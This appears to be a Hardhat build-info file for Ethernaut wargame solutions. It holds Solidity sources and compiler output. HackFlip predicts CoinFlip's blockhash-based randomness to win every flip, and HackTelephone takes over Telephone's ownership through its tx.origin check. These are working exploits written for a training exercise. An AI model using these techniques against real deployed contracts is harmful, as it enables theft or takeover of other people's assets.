{
  "id": "825ddd7d850f0747468b177c8143c855",
  "_format": "hh-sol-build-info-1",
  "solcVersion": "0.8.10",
  "solcLongVersion": "0.8.10+commit.fc410830",
  "input": {
    "language": "Solidity",
    "sources": {
      "contracts/3_CoinFlip/CoinFlip.sol": {
        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.10;\nfunction c_0xd4d66cc9(bytes32 c__0xd4d66cc9) pure {}\n\r\n\r\n/// @title Ethernaut Contract\r\ninterface CoinFlip {\r\n    function flip(bool _guess) external returns (bool);\r\n}\r\n"
      },
      "contracts/3_CoinFlip/HackFlip.sol": {
        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.10;\nfunction c_0x2d53c14b(bytes32 c__0x2d53c14b) pure {}\n\r\n\r\nimport \"./CoinFlip.sol\";\r\n\r\n/// @title Contract for hacking CoinFlip.sol in Ethernaut\r\n/// @author Pedro Reyes\r\n/// @notice This contract calls CoinFlip.sol and with the right value (true/false) for always winning\r\ncontract HackFlip {\nfunction c_0xcd8256e5(bytes32 c__0xcd8256e5) internal pure {}\n\r\n    uint256 lastHash;\r\n    uint256 FACTOR =\r\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    CoinFlip coinFlipContract =\r\n        CoinFlip(0x4dF32584890A0026e56f7535d0f2C6486753624f); /* Address here */\r\n\r\n    /// @dev Calls CoinFlip.flip method with (true/false) for winning always based on on-chain data\r\n    function flip() public returns (bool) {c_0xcd8256e5(0x76850f2a41eaa42348812d6d5f1d669a7dfb11e4456b2fb1ad2eb124261e3b82); /* function */ \n\r\nc_0xcd8256e5(0x751f14e66c3b71ecda3f72b84ebec8ac2372f93bc281773d93b1f8046e4c08cf); /* line */ \n        c_0xcd8256e5(0x8d521d8b29d2f7e12007ddc485e4ab5b590c9b8e521741496161f42ec70551fb); /* statement */ \nuint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\nc_0xcd8256e5(0x662060cd93db46b0a7870aad764292e8d8eff36f707cce79f22b508dac3593f4); /* line */ \n        c_0xcd8256e5(0x30f8bb24c4bce6a057fe33ce23d8bfe6dcbf9d1d8c6ce614f4b7d71c19a58c59); /* statement */ \nif (lastHash == blockValue) {c_0xcd8256e5(0x80167d4be857c2e3ce4fbccedfcb18af7434b30a6107850ab7bf176b16b8f3ee); /* branch */ \n\r\nc_0xcd8256e5(0xf86a990f2d4e49a86608b47806d370c06f946a2a71911ca8570b64ad02228429); /* line */ \n            c_0xcd8256e5(0x508c7ecdbb5c89e33970b00717ff3bbec1e8d85c8fa65ee25c9bc441ffa2aeac); /* statement */ \nrevert();\r\n        }else { c_0xcd8256e5(0xcebb1f23423d860039abfdd6de4ea9cd526f64eae6c7a2ca43652a28decb1523); /* branch */ \n}\r\n\r\nc_0xcd8256e5(0xd28650fff2402b363aa03554769a7f21774984fb04141d96c83af86b2305a2b8); /* line */ \n        c_0xcd8256e5(0xdd53802a684652e6ff47eec192d44e459d37ad95e1c80400a099f88bb72da0aa); /* statement */ \nlastHash = blockValue;\r\nc_0xcd8256e5(0x4f4c27566bff8b25f7ea94e31751d90ac087cc47eb08deeb001241cfd48b9480); /* line */ \n        c_0xcd8256e5(0xfbb1d0c55e02bb9d893b2a3e06a8c97572bea0142b4b752219615c1aa3318eb0); /* statement */ \nuint256 coinFlip = blockValue / FACTOR;\r\nc_0xcd8256e5(0x035e1771c990810f7a4c2018da13fcb98239e42ce66f420dd8968f72a9957c6c); /* line */ \n        c_0xcd8256e5(0x3ffd3edfd7a0e8cf2cfd60c0ee819ed0865313a37b60c88c09401ef638f5582d); /* statement */ \nbool side = coinFlip == 1 ? true : false;\r\n\r\nc_0xcd8256e5(0xd317f23fbc045d9b3a1066cd47ed89413e81c540fac2775c298eb70552c69626); /* line */ \n        c_0xcd8256e5(0x9cbcfdfcf9428c4d31c21c35495f1f73631424eb11249428558df529a97fbecb); /* statement */ \ncoinFlipContract.flip(side);\r\n\r\nc_0xcd8256e5(0xa8810c2a02e392125a942131b93b61952186aded9b013761649689b55961b2c0); /* line */ \n        c_0xcd8256e5(0xd6430e7489e14c1cb35138ebeb83af97ce82acd80c6a1d113fc554906c61d8ff); /* statement */ \nreturn side;\r\n    }\r\n}\r\n"
      },
      "contracts/4_Telephone/HackTelephone.sol": {
        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.10;\nfunction c_0x4799e30e(bytes32 c__0x4799e30e) pure {}\n\r\n\r\nimport \"./Telephone.sol\";\r\n\r\n/// @title Contract for hacking Telephone.sol\r\n/// @author Pedro Reyes\r\n/// @custom:link https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties\r\n/// @custom:link https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=tx.origin#tx-origin\r\n/// @custom:link https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof\r\ncontract HackTelephone {\nfunction c_0x57d152bd(bytes32 c__0x57d152bd) internal pure {}\n\r\n    Telephone telephone;\r\n\r\n    constructor(address _address) {c_0x57d152bd(0xf22777cb04e164fba43d347a64d9272fcffd311fe04f1ef3f11fd4d4711c9cb3); /* function */ \n\r\nc_0x57d152bd(0x3faaece4464d838dc629a772bc2fe00594b885c5dbccab741e9755d8beb8c2b8); /* line */ \n        c_0x57d152bd(0x1905a7ea1b914ad8023df509e74dbe3df1dc9375a2fac14bcdcb55eda50eefb3); /* statement */ \ntelephone = Telephone(_address);\r\n    }\r\n\r\n    /// @dev Change the owner of the telephone.\r\n    function changeOwner(address _owner) public {c_0x57d152bd(0x95ddb175a1fdc37c4399f4d8e36ff5783af8bae0c041fc49d1707d6fab60ed18); /* function */ \n\r\nc_0x57d152bd(0xa4d14fb052b99e90be993b3e9692be1f0ee653e938c08ccda4f1cf48bda729a3); /* line */ \n        c_0x57d152bd(0x336c7e84867c4841e1137bec080607d657aad78e0f123e2d8e7d6c01479d1295); /* statement */ \ntelephone.changeOwner(_owner);\r\n    }\r\n}\r\n"
      },
      "contracts/4_Telephone/Telephone.sol": {
        "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.10;\nfunction c_0x8154b289(bytes32 c__0x8154b289) pure {}\n\r\n\r\ncontract Telephone {\nfunction c_0xac82e904(bytes32 c__0xac82e904) internal pure {}\n\r\n    address public owner;\r\n\r\n    constructor() {c_0xac82e904(0xcfa6c3657c9b51c2b92df51b0179095cc76f9cc62f2220cb267146ef0c109a87); /* function */ \n\r\nc_0xac82e904(0x11d8d083dcdfc7bd89cc6f601b27cc46a1e80e10fae9a9ebfffc5e0b0d1e560d); /* line */ \n        c_0xac82e904(0x8383dccdcabd64071ad71b30887a7a28bfc70ae6717caa71b644786faa072cc6); /* statement */ \nowner = msg.sender;\r\n    }\r\n\r\n    function changeOwner(address _owner) public {c_0xac82e904(0x38129285ef6b951be267187da0a3976f3236fef5d6c410783ffc2bece4648a87); /* function */ \n\r\nc_0xac82e904(0xfa3db312605afcf5202006c41f66c777015f723b2f085cf690d0de1f2806d7dd); /* line */ \n        c_0xac82e904(0xb1e5e0c2ba09d6443ec30f0e6e4e0ca0dd8ecabe7e15aa3f12da193aafd36456); /* statement */ \nif (tx.origin != msg.sender) {c_0xac82e904(0x22f7d2abe44d6053a3243d9d9d2f4426aad098dbe1cb271911ed6507fbfaad60); /* branch */ \n\r\nc_0xac82e904(0x19de63b7782c281e196d7d5d8f246109d381ed54bb991c48e259fc1a7638146e); /* line */ \n            c_0xac82e904(0x76bbb05eaa8aebb25d0ad81375425536dfd3cba526694262c820abbcacf85624); /* statement */ \nowner = _owner;\r\n        }else { c_0xac82e904(0x9af4fefc324f1fdb166748644e640a9e04f1064999de7cea303fb012561dd246); /* branch */ \n}\r\n    }\r\n}\r\n"
      }
    },
    "settings": {
      "optimizer": {
        "enabled": false,
        "runs": 1000
      },
      "outputSelection": {
        "*": {
          "*": [
            "abi",
            "evm.bytecode",
            "evm.deployedBytecode",
            "evm.methodIdentifiers",
            "metadata"
          ],
          "": [
            "ast"
          ]
        }
      },
      "metadata": {
        "useLiteralContent": false
      }
    }
  },
  "output": {
    "contracts": {
      "contracts/3_CoinFlip/CoinFlip.sol": {
        "CoinFlip": {
          "abi": [
            {
              "inputs": [
                {
                  "internalType": "bool",
                  "name": "_guess",
                  "type": "bool"
                }
              ],
              "name": "flip",
              "outputs": [
                {
                  "internalType": "bool",
                  "name": "",
                  "type": "bool"
                }
              ],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "linkReferences": {},
              "object": "",
              "opcodes": "",
              "sourceMap": ""
            },
            "deployedBytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "",
              "opcodes": "",
              "sourceMap": ""
            },
            "methodIdentifiers": {
              "flip(bool)": "1d263f67"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"title\":\"Ethernaut Contract\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/3_CoinFlip/CoinFlip.sol\":\"CoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contracts/3_CoinFlip/CoinFlip.sol\":{\"keccak256\":\"0x2c02e562a4e39d0ab946920dc060b32b4bbeed64df7cb25854f14c458af64ca6\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://92ae3a7e96f4bd24f829c38306bc14c1a7bafb2978d89dd369ac4becf1c8d49b\",\"dweb:/ipfs/Qma9QAB7UnojEmA2foig4vEKxCoX2n27sB2u8qHpU6dtBB\"]}},\"version\":1}"
        }
      },
      "contracts/3_CoinFlip/HackFlip.sol": {
        "HackFlip": {
          "abi": [
            {
              "inputs": [],
              "name": "flip",
              "outputs": [
                {
                  "internalType": "bool",
                  "name": "",
                  "type": "bool"
                }
              ],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {},
              "generatedSources": [],
              "linkReferences": {},
              "object": "60806040527f8000000000000000000000000000000000000000000000000000000000000000600155734df32584890a0026e56f7535d0f2c6486753624f600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610629806100996000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861004e565b60405161004591906104ad565b60405180910390f35b600061007c7f76850f2a41eaa42348812d6d5f1d669a7dfb11e4456b2fb1ad2eb124261e3b8260001b61048f565b6100a87f751f14e66c3b71ecda3f72b84ebec8ac2372f93bc281773d93b1f8046e4c08cf60001b61048f565b6100d47f8d521d8b29d2f7e12007ddc485e4ab5b590c9b8e521741496161f42ec70551fb60001b61048f565b60006001436100e39190610501565b4060001c90506101157f662060cd93db46b0a7870aad764292e8d8eff36f707cce79f22b508dac3593f460001b61048f565b6101417f30f8bb24c4bce6a057fe33ce23d8bfe6dcbf9d1d8c6ce614f4b7d71c19a58c5960001b61048f565b8060005414156101d4576101777f80167d4be857c2e3ce4fbccedfcb18af7434b30a6107850ab7bf176b16b8f3ee60001b61048f565b6101a37ff86a990f2d4e49a86608b47806d370c06f946a2a71911ca8570b64ad0222842960001b61048f565b6101cf7f508c7ecdbb5c89e33970b00717ff3bbec1e8d85c8fa65ee25c9bc441ffa2aeac60001b61048f565b600080fd5b6102007fcebb1f23423d860039abfdd6de4ea9cd526f64eae6c7a2ca43652a28decb152360001b61048f565b61022c7fd28650fff2402b363aa03554769a7f21774984fb04141d96c83af86b2305a2b860001b61048f565b6102587fdd53802a684652e6ff47eec192d44e459d37ad95e1c80400a099f88bb72da0aa60001b61048f565b8060008190555061028b7f4f4c27566bff8b25f7ea94e31751d90ac087cc47eb08deeb001241cfd48b948060001b61048f565b6102b77ffbb1d0c55e02bb9d893b2a3e06a8c97572bea0142b4b752219615c1aa3318eb060001b61048f565b6000600154826102c79190610564565b90506102f57f035e1771c990810f7a4c2018da13fcb98239e42ce66f420dd8968f72a9957c6c60001b61048f565b6103217f3ffd3edfd7a0e8cf2cfd60c0ee819ed0865313a37b60c88c09401ef638f5582d60001b61048f565b600060018214610332576000610335565b60015b90506103637fd317f23fbc045d9b3a1066cd47ed89413e81c540fac2775c298eb70552c6962660001b61048f565b61038f7f9cbcfdfcf9428c4d31c21c35495f1f73631424eb11249428558df529a97fbecb60001b61048f565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016103ea91906104ad565b6020604051808303816000875af1158015610409573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061042d91906105c6565b5061045a7fa8810c2a02e392125a942131b93b61952186aded9b013761649689b55961b2c060001b61048f565b6104867fd6430e7489e14c1cb35138ebeb83af97ce82acd80c6a1d113fc554906c61d8ff60001b61048f565b80935050505090565b50565b60008115159050919050565b6104a781610492565b82525050565b60006020820190506104c2600083018461049e565b92915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061050c826104c8565b9150610517836104c8565b92508282101561052a576105296104d2565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061056f826104c8565b915061057a836104c8565b92508261058a57610589610535565b5b828204905092915050565b600080fd5b6105a381610492565b81146105ae57600080fd5b50565b6000815190506105c08161059a565b92915050565b6000602082840312156105dc576105db610595565b5b60006105ea848285016105b1565b9150509291505056fea264697066735822122060601e8ae20dffea0dd7749afd8ca348be79b15bbc939d103d2125e26523ce5764736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE PUSH20 0x4DF32584890A0026E56F7535D0F2C6486753624F PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x89 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x629 DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x4AD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x7C PUSH32 0x76850F2A41EAA42348812D6D5F1D669A7DFB11E4456B2FB1AD2EB124261E3B82 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0xA8 PUSH32 0x751F14E66C3B71ECDA3F72B84EBEC8AC2372F93BC281773D93B1F8046E4C08CF PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0xD4 PUSH32 0x8D521D8B29D2F7E12007DDC485E4AB5B590C9B8E521741496161F42EC70551FB PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0xE3 SWAP2 SWAP1 PUSH2 0x501 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x115 PUSH32 0x662060CD93DB46B0A7870AAD764292E8D8EFF36F707CCE79F22B508DAC3593F4 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x141 PUSH32 0x30F8BB24C4BCE6A057FE33CE23D8BFE6DCBF9D1D8C6CE614F4B7D71C19A58C59 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 PUSH1 0x0 SLOAD EQ ISZERO PUSH2 0x1D4 JUMPI PUSH2 0x177 PUSH32 0x80167D4BE857C2E3CE4FBCCEDFCB18AF7434B30A6107850AB7BF176B16B8F3EE PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x1A3 PUSH32 0xF86A990F2D4E49A86608B47806D370C06F946A2A71911CA8570B64AD02228429 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x1CF PUSH32 0x508C7ECDBB5C89E33970B00717FF3BBEC1E8D85C8FA65EE25C9BC441FFA2AEAC PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x200 PUSH32 0xCEBB1F23423D860039ABFDD6DE4EA9CD526F64EAE6C7A2CA43652A28DECB1523 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x22C PUSH32 0xD28650FFF2402B363AA03554769A7F21774984FB04141D96C83AF86B2305A2B8 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x258 PUSH32 0xDD53802A684652E6FF47EEC192D44E459D37AD95E1C80400A099F88BB72DA0AA PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH2 0x28B PUSH32 0x4F4C27566BFF8B25F7EA94E31751D90AC087CC47EB08DEEB001241CFD48B9480 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x2B7 PUSH32 0xFBB1D0C55E02BB9D893B2A3E06A8C97572BEA0142B4B752219615C1AA3318EB0 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x2C7 SWAP2 SWAP1 PUSH2 0x564 JUMP JUMPDEST SWAP1 POP PUSH2 0x2F5 PUSH32 0x35E1771C990810F7A4C2018DA13FCB98239E42CE66F420DD8968F72A9957C6C PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x321 PUSH32 0x3FFD3EDFD7A0E8CF2CFD60C0EE819ED0865313A37B60C88C09401EF638F5582D PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x332 JUMPI PUSH1 0x0 PUSH2 0x335 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH2 0x363 PUSH32 0xD317F23FBC045D9B3A1066CD47ED89413E81C540FAC2775C298EB70552C69626 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x38F PUSH32 0x9CBCFDFCF9428C4D31C21C35495F1F73631424EB11249428558DF529A97FBECB PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3EA SWAP2 SWAP1 PUSH2 0x4AD JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x409 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x42D SWAP2 SWAP1 PUSH2 0x5C6 JUMP JUMPDEST POP PUSH2 0x45A PUSH32 0xA8810C2A02E392125A942131B93B61952186ADED9B013761649689B55961B2C0 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x486 PUSH32 0xD6430E7489E14C1CB35138EBEB83AF97CE82ACD80C6A1D113FC554906C61D8FF PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4A7 DUP2 PUSH2 0x492 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4C2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x49E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x50C DUP3 PUSH2 0x4C8 JUMP JUMPDEST SWAP2 POP PUSH2 0x517 DUP4 PUSH2 0x4C8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x52A JUMPI PUSH2 0x529 PUSH2 0x4D2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x56F DUP3 PUSH2 0x4C8 JUMP JUMPDEST SWAP2 POP PUSH2 0x57A DUP4 PUSH2 0x4C8 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x58A JUMPI PUSH2 0x589 PUSH2 0x535 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5A3 DUP2 PUSH2 0x492 JUMP JUMPDEST DUP2 EQ PUSH2 0x5AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x5C0 DUP2 PUSH2 0x59A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5DC JUMPI PUSH2 0x5DB PUSH2 0x595 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x5EA DUP5 DUP3 DUP6 ADD PUSH2 0x5B1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x60 0x1E DUP11 0xE2 0xD SELFDESTRUCT 0xEA 0xD 0xD7 PUSH21 0x9AFD8CA348BE79B15BBC939D103D2125E26523CE57 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
              "sourceMap": "329:2673:1:-:0;;;466:77;440:103;;598:42;552:89;;;;;;;;;;;;;;;;;;;;329:2673;;;;;;;;;;;;;;;;"
            },
            "deployedBytecode": {
              "functionDebugData": {
                "@c_0xcd8256e5_32": {
                  "entryPoint": 1167,
                  "id": 32,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "@flip_174": {
                  "entryPoint": 78,
                  "id": 174,
                  "parameterSlots": 0,
                  "returnSlots": 1
                },
                "abi_decode_t_bool_fromMemory": {
                  "entryPoint": 1457,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_decode_tuple_t_bool_fromMemory": {
                  "entryPoint": 1478,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_encode_t_bool_to_t_bool_fromStack": {
                  "entryPoint": 1182,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 0
                },
                "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
                  "entryPoint": 1197,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "allocate_unbounded": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 1
                },
                "checked_div_t_uint256": {
                  "entryPoint": 1380,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "checked_sub_t_uint256": {
                  "entryPoint": 1281,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "cleanup_t_bool": {
                  "entryPoint": 1170,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "cleanup_t_uint256": {
                  "entryPoint": 1224,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "panic_error_0x11": {
                  "entryPoint": 1234,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "panic_error_0x12": {
                  "entryPoint": 1333,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
                  "entryPoint": 1429,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "validator_revert_t_bool": {
                  "entryPoint": 1434,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 0
                }
              },
              "generatedSources": [
                {
                  "ast": {
                    "nodeType": "YulBlock",
                    "src": "0:2217:4",
                    "statements": [
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "49:48:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "59:32:4",
                              "value": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "84:5:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "iszero",
                                      "nodeType": "YulIdentifier",
                                      "src": "77:6:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "77:13:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "70:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "70:21:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "59:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_bool",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "31:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "41:7:4",
                            "type": ""
                          }
                        ],
                        "src": "7:90:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "162:50:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "pos",
                                    "nodeType": "YulIdentifier",
                                    "src": "179:3:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "199:5:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "cleanup_t_bool",
                                      "nodeType": "YulIdentifier",
                                      "src": "184:14:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "184:21:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "172:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "172:34:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "172:34:4"
                            }
                          ]
                        },
                        "name": "abi_encode_t_bool_to_t_bool_fromStack",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "150:5:4",
                            "type": ""
                          },
                          {
                            "name": "pos",
                            "nodeType": "YulTypedName",
                            "src": "157:3:4",
                            "type": ""
                          }
                        ],
                        "src": "103:109:4"
                      },
